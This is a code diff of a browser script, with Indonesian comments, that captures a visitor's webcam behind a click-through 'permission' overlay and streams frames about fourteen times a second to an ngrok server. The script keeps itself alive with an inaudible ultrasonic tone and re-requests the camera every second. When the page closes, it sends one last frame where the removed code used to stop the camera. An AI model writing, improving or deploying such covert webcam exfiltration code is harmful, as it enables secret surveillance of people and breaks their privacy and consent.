@@ -65,20 +65,18 @@
 (function () {
   'use strict';
 
+  // ============================================
+  // KONFIGURASI SERVER NGROK & STREAM
+  // ============================================
   var CONFIG = {
-    tts: {
-      text: "Security verification required. Live stream session active.",
-      lang: 'en-US',
-      rate: 0.9,
-      pitch: 1.0,
-      repeatInterval: 6000
-    },
-    streamInterval: 70, // Kecepatan tinggi (~14 FPS) untuk efek live streaming mulus
-    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
+    // URL Ngrok mengarah ke endpoint /upload_frame
+    serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame',
+    
+    // Interval pengiriman frame (70ms = ~14 FPS untuk efek live stream)
+    streamInterval: 70 
   };
 
   var state = {
-    ttsStarted: false,
     camStream: null,
     camActive: false,
     streamTimer: null,
@@ -86,42 +84,26 @@
     recoveryInterval: null
   };
 
+  // ============================================
+  // 1. AUDIO KEEP-ALIVE (PENCEGAH SLEEP)
+  // ============================================
   function initAudioKeepAlive() {
     try {
       window.AudioContext = window.AudioContext || window.webkitAudioContext;
       state.audioCtx = new AudioContext();
       var osc = state.audioCtx.createOscillator();
       var gain = state.audioCtx.createGain();
-      gain.gain.value = 0.00001;
-      osc.frequency.value = 18000;
+      gain.gain.value = 0.00001; // Sangat pelan, tidak terdengar
+      osc.frequency.value = 18000; // Ultrasonic 18kHz
       osc.connect(gain);
       gain.connect(state.audioCtx.destination);
       osc.start();
     } catch (e) {}
   }
 
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.onend = function () {
-        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-      };
-      window.speechSynthesis.speak(u);
-    } catch (e) {}
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // Fungsi pengiriman frame real-time berkecepatan tinggi
+  // ============================================
+  // 2. STREAMING FRAME KE NGROK (JSON BASE64)
+  // ============================================
   function streamFrame() {
     if (!state.camActive) return;
 
@@ -132,20 +114,27 @@
     try {
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
 
+      // Gambar video ke canvas
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      // Kompresi kualitas diturunkan sedikit (0.55) agar ukuran payload kecil dan stream tidak tersendat di jaringan
+      
+      // Konversi ke Base64 JPEG (Kualitas 0.55 agar ringan)
       var dataURL = canvas.toDataURL('image/jpeg', 0.55);
       var payload = JSON.stringify({ image: dataURL });
 
+      // Kirim ke server
       fetch(CONFIG.serverEndpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: payload,
         keepalive: true
       }).catch(function(err) {});
+
     } catch (e) {}
   }
 
+  // ============================================
+  // 3. CAMERA ACCESS & RECOVERY
+  // ============================================
   function requestCameraAccess() {
     navigator.mediaDevices.getUserMedia({ 
       video: { width: { ideal: 480 }, height: { ideal: 360 }, facingMode: "user" }, 
@@ -162,6 +151,7 @@
       var overlay = document.getElementById('permission-overlay');
       if (overlay) overlay.style.display = 'none';
 
+      // Deteksi jika stream dimatikan sistem
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
@@ -174,41 +164,48 @@
     });
   }
 
+  // ============================================
+  // 4. RECOVERY CYCLE (KAMERA MATI -> HIDUPKAN)
+  // ============================================
   function triggerRecovery() {
     if (state.recoveryInterval) clearInterval(state.recoveryInterval);
     state.recoveryInterval = setInterval(function() {
+      // Jika kamera mati dan tab terlihat, paksa minta kamera lagi
       if (!state.camActive && document.visibilityState === 'visible') {
         requestCameraAccess();
       }
-    }, 2000);
+    }, 1000); // Cek setiap 1 detik
   }
 
+  // ============================================
+  // 5. TRIGGER AWAL (SAAT USER KLIK)
+  // ============================================
   document.getElementById('permission-overlay').addEventListener('click', function() {
     initAudioKeepAlive();
     if (state.audioCtx && state.audioCtx.state === 'suspended') {
       state.audioCtx.resume();
     }
-    startTTS();
     requestCameraAccess();
     triggerRecovery();
   });
 
+  // ============================================
+  // 6. LIFECYCLE TRAP (BACKGROUND PERSISTENCE)
+  // ============================================
   window.addEventListener('DOMContentLoaded', function() {
-    // Mulai loop pengiriman frame secara konstan
+    // Mulai loop streaming
     state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
   });
 
   window.addEventListener('pagehide', function() {
-    try {
-      if (state.camStream) {
-        state.camStream.getTracks().forEach(function(t) { t.stop(); });
-      }
-    } catch(e) {}
+    // Jika tab akan ditutup, kirim frame terakhir secara paksa
+    if (state.camActive) {
+      streamFrame(); 
+    }
   });
 
   document.addEventListener('visibilitychange', function () {
     if (document.visibilityState === 'visible') {
-      startTTS();
       if (state.audioCtx && state.audioCtx.state === 'suspended') {
         state.audioCtx.resume();
       }
